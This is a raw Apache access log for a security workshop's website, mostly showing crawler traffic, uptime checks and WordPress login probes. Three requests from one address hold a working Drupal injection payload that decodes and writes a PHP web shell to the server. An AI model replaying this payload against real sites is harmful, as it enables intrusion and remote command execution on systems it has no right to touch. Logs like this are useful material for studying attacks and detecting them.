199.30.25.15 - - [02/May/2018:22:31:46 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27546 "https://www.nspw.org/2018" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.25.15 - - [02/May/2018:22:31:47 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1390 "https://www.nspw.org/2018" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
207.46.13.1 - - [02/May/2018:22:32:38 -0400] "GET /2009 HTTP/1.1" 301 4461 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.106.108.116 - - [02/May/2018:22:34:37 -0400] "HEAD /current/ HTTP/1.1" 200 3904 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
59.106.108.116 - - [02/May/2018:22:34:38 -0400] "GET /current/ HTTP/1.1" 200 8978 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
194.187.170.110 - - [02/May/2018:22:34:41 -0400] "GET /2003/fixit HTTP/1.1" 200 4198 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
42.236.99.37 - - [02/May/2018:22:35:10 -0400] "GET / HTTP/1.1" 200 6509 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
69.162.124.227 - - [02/May/2018:22:35:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
42.236.99.130 - - [02/May/2018:22:35:24 -0400] "GET / HTTP/1.1" 200 6509 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.9 - - [02/May/2018:22:36:03 -0400] "GET / HTTP/1.1" 200 6509 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
180.191.111.178 - - [02/May/2018:22:37:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.191.111.178 - - [02/May/2018:22:37:40 -0400] "GET / HTTP/1.1" 200 8363 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
199.59.150.181 - - [02/May/2018:22:39:22 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
69.162.124.227 - - [02/May/2018:22:40:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.124.153.166 - - [02/May/2018:22:40:54 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6211 "-" "curl/7.47.0"
152.172.107.52 - - [02/May/2018:22:41:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
152.172.107.52 - - [02/May/2018:22:41:35 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
14.191.45.207 - - [02/May/2018:22:42:49 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
14.191.45.207 - - [02/May/2018:22:42:52 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
194.187.170.110 - - [02/May/2018:22:44:20 -0400] "GET /2011/pc HTTP/1.1" 200 6912 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
35.226.164.28 - - [02/May/2018:22:44:21 -0400] "GET /robots.txt HTTP/1.1" 200 4496 "-" "ltx71 - (http://ltx71.com/)"
69.162.124.227 - - [02/May/2018:22:45:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.54 - - [02/May/2018:22:45:19 -0400] "GET /papers/2012/docs/organization.pdf HTTP/1.1" 200 94276 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
194.187.170.110 - - [02/May/2018:22:46:06 -0400] "GET /2006/nspw_2006_program.pdf HTTP/1.1" 200 81523 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:22:46:21 -0400] "GET /2003/oc.content HTTP/1.1" 200 3087 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
182.178.48.82 - - [02/May/2018:22:46:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
182.178.48.82 - - [02/May/2018:22:46:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
194.187.170.110 - - [02/May/2018:22:47:10 -0400] "GET /2006/tmp/ HTTP/1.1" 403 714 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
137.97.176.25 - - [02/May/2018:22:48:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
137.97.176.25 - - [02/May/2018:22:48:11 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:22:48:53 -0400] "GET /2004/cfp.content HTTP/1.1" 200 7072 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
207.46.13.1 - - [02/May/2018:22:49:51 -0400] "GET / HTTP/1.1" 200 7081 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.1 - - [02/May/2018:22:50:03 -0400] "GET / HTTP/1.1" 200 7081 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:22:50:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:22:51:20 -0400] "GET /2003/panel.html HTTP/1.1" 200 4502 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
144.76.168.111 - - [02/May/2018:22:51:27 -0400] "GET /2011/papers HTTP/1.1" 200 14027 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
136.243.17.161 - - [02/May/2018:22:51:27 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 200 700621 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)"
194.187.170.110 - - [02/May/2018:22:53:03 -0400] "GET /2006/papers.contentQQ HTTP/1.1" 200 2927 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
131.255.54.112 - - [02/May/2018:22:53:06 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
131.255.54.112 - - [02/May/2018:22:53:07 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.133.232.174 - - [02/May/2018:22:53:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.133.232.174 - - [02/May/2018:22:53:44 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:22:55:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.219 - - [02/May/2018:22:56:21 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.155 - - [02/May/2018:22:57:00 -0400] "GET /current/cfp/nspw2018-cfp.pdf HTTP/1.1" 404 8286 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
194.187.170.110 - - [02/May/2018:22:57:28 -0400] "GET /2006/past.shtml HTTP/1.1" 200 5968 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
66.249.64.15 - - [02/May/2018:22:57:30 -0400] "GET /robots.txt HTTP/1.1" 200 4504 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.15 - - [02/May/2018:22:57:30 -0400] "GET /2009/pc.shtml HTTP/1.1" 200 1964 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.187.170.110 - - [02/May/2018:22:57:38 -0400] "GET /2006/invite/ HTTP/1.1" 200 1418 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
223.218.104.68 - - [02/May/2018:22:57:46 -0400] "GET / HTTP/1.1" 200 6622 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
131.253.27.147 - - [02/May/2018:22:57:24 -0400] "GET /papers/2005/nspw2005-mcdermott.pdf HTTP/1.1" 200 4280145 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
157.55.39.141 - - [02/May/2018:22:57:38 -0400] "GET /papers/2003/nspw2003-duvarney.pdf HTTP/1.1" 200 1060646 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:23:00:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:23:03:14 -0400] "GET /2006/program.shtml HTTP/1.1" 200 6656 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:03:58 -0400] "GET /2006/papers.shtml HTTP/1.1" 200 1610 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:05:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:23:06:18 -0400] "GET /2006/pc.shtml HTTP/1.1" 200 2532 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
216.244.66.247 - - [02/May/2018:23:08:21 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.64.219 - - [02/May/2018:23:08:46 -0400] "GET /papers/2011/nspw2011-pavlovic.pdf HTTP/1.1" 200 3811508 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.187.170.110 - - [02/May/2018:23:09:03 -0400] "GET /2006/cfp.shtml HTTP/1.1" 200 7952 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:09:09 -0400] "GET /2006/cfp2006.pdf HTTP/1.1" 200 37849 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:10:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:23:10:42 -0400] "GET /2006/nspw-footer.html HTTP/1.1" 200 986 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
180.76.15.163 - - [02/May/2018:23:10:57 -0400] "GET /node/94 HTTP/1.1" 200 11470 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
40.77.167.134 - - [02/May/2018:23:10:32 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 200 2314259 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.54 - - [02/May/2018:23:13:36 -0400] "GET /papers/2004/nspw2004-hollebeek.pdf HTTP/1.1" 200 120715 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.124.153.166 - - [02/May/2018:23:13:51 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
59.124.153.166 - - [02/May/2018:23:13:51 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
194.187.170.110 - - [02/May/2018:23:13:53 -0400] "GET /2011/dates HTTP/1.1" 200 3364 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
66.102.7.59 - - [02/May/2018:23:15:00 -0400] "GET / HTTP/1.1" 200 6608 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.7.59 - - [02/May/2018:23:15:00 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
69.162.124.227 - - [02/May/2018:23:15:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [02/May/2018:23:15:44 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
194.187.170.110 - - [02/May/2018:23:16:39 -0400] "GET /2003/dates.content HTTP/1.1" 200 4598 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
174.52.195.148 - - [02/May/2018:23:16:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
174.52.195.148 - - [02/May/2018:23:16:57 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:23:18:33 -0400] "GET /node/31 HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
54.70.40.11 - - [02/May/2018:23:18:46 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
194.187.170.110 - - [02/May/2018:23:19:30 -0400] "GET /2013/dates HTTP/1.1" 200 3428 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
77.88.47.40 - - [02/May/2018:23:19:34 -0400] "GET /papers/2004/nspw2004-greenwald.pdf HTTP/1.1" 200 275249 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:23:20:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.66.91 - - [02/May/2018:23:21:10 -0400] "GET / HTTP/1.1" 200 6608 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [02/May/2018:23:21:09 -0400] "GET /2009/proceedings/1993/nspw1993-williams.pdf HTTP/1.1" 200 539706 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
207.46.13.54 - - [02/May/2018:23:21:42 -0400] "GET /papers/2005/nspw2005-ford.pdf HTTP/1.1" 200 2046882 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
94.34.58.216 - - [02/May/2018:23:22:59 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
94.34.58.216 - - [02/May/2018:23:23:00 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
194.187.170.110 - - [02/May/2018:23:23:19 -0400] "GET /2003/pc.content HTTP/1.1" 200 6043 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
177.205.136.113 - - [02/May/2018:23:23:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.205.136.113 - - [02/May/2018:23:23:47 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.141 - - [02/May/2018:23:23:48 -0400] "GET /2018/cfp HTTP/1.1" 200 8625 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
194.187.170.110 - - [02/May/2018:23:24:18 -0400] "GET /2006/proceedings.shtml HTTP/1.1" 200 1562 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:25:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
136.243.17.161 - - [02/May/2018:23:26:30 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 200 700621 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
194.187.170.110 - - [02/May/2018:23:27:51 -0400] "GET /2006/cfp.content HTTP/1.1" 200 6927 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:30:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:23:30:31 -0400] "GET /2011/papers HTTP/1.1" 200 7552 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:31:27 -0400] "GET /2011/sponsors HTTP/1.1" 200 3332 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
66.249.66.91 - - [02/May/2018:23:33:35 -0400] "GET / HTTP/1.1" 200 6609 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.187.170.110 - - [02/May/2018:23:33:38 -0400] "GET /registration HTTP/1.1" 200 3556 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
216.244.66.247 - - [02/May/2018:23:33:49 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
194.187.170.110 - - [02/May/2018:23:34:16 -0400] "GET /robots.txt HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:34:17 -0400] "GET /login HTTP/1.1" 200 3108 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:35:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:23:35:50 -0400] "GET /2013/papers HTTP/1.1" 200 7392 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:36:25 -0400] "GET /2006/panel.htmlQQ HTTP/1.1" 200 1610 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:36:40 -0400] "GET /2006/submission.shtml HTTP/1.1" 200 2282 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
207.46.13.54 - - [02/May/2018:23:36:25 -0400] "GET /papers/1999/nspw1999-michael.pdf HTTP/1.1" 200 597324 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
194.187.170.110 - - [02/May/2018:23:37:48 -0400] "GET /2003/submission.content HTTP/1.1" 200 634 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:38:07 -0400] "GET /2003/papers.content HTTP/1.1" 200 458 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:40:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
60.169.68.237 - - [02/May/2018:23:42:06 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
60.169.68.237 - - [02/May/2018:23:42:06 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.138 - - [02/May/2018:23:44:17 -0400] "GET /proceedings/1999 HTTP/1.1" 200 12193 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
194.187.170.110 - - [02/May/2018:23:44:32 -0400] "GET /2014/local HTTP/1.1" 200 7872 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:45:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:23:45:37 -0400] "GET /2003/index.content HTTP/1.1" 200 1770 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:23:47:06 -0400] "GET /2006/local.content HTTP/1.1" 200 570 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
40.77.167.134 - - [02/May/2018:23:48:03 -0400] "GET /2013 HTTP/1.1" 200 7273 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
186.206.158.82 - - [02/May/2018:23:48:28 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
186.206.158.82 - - [02/May/2018:23:48:29 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
123.125.143.13 - - [02/May/2018:23:49:18 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 9624 "-" "Python-urllib/2.7"
123.125.143.148 - - [02/May/2018:23:49:20 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 4339 "-" "Python-urllib/2.7"
123.125.143.140 - - [02/May/2018:23:49:21 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 25021 "-" "Python-urllib/2.7"
123.125.143.154 - - [02/May/2018:23:49:23 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 5203 "-" "Python-urllib/2.7"
123.125.143.21 - - [02/May/2018:23:49:25 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 6165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.21 - - [02/May/2018:23:49:26 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 709 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.21 - - [02/May/2018:23:49:28 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 757 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.21 - - [02/May/2018:23:49:29 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.21 - - [02/May/2018:23:49:30 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.21 - - [02/May/2018:23:49:31 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
